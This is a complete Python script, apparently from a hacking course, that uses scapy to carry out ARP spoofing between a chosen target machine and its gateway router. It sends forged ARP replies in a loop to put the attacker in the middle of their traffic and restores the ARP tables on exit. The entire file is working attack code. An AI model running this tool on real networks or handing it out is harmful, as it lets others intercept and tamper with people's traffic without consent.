#!/usr/bin/env python
import optparse
import sys
import time

import scapy.all as scapy

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target_ip", help="IP address of the target machine")
    parser.add_option("-g", "--gateway", dest="gateway_ip", help="IP address of the gateway (router)")
    (options, arguments) = parser.parse_args()
    if not options.target_ip:
        parser.error("[-] Please specify a target IP. Use --help for more information")
    elif not options.gateway_ip:
        parser.error("[-] Please specify a gateway IP. Use --help for more information")
    return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    source_mac = get_mac(source_ip)
    destination_mac = get_mac(destination_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


sent_packets = 0
# target_ip = "10.0.2.5"
# gateway_ip = "10.0.2.1"
options= get_arguments()
target_ip = options.target_ip
gateway_ip = options.gateway_ip
try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets += 2
        print("\r[+] Packets sent: " + str(sent_packets), end="")
        # print("\r[+] Packets sent: " + str(sent_packets)),
        # sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Resetting ARP table. Program terminated")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)

# psrc = ip of router
# pdst = target device

# uncomment line 28 and line 27 to run on python 2.7 and below
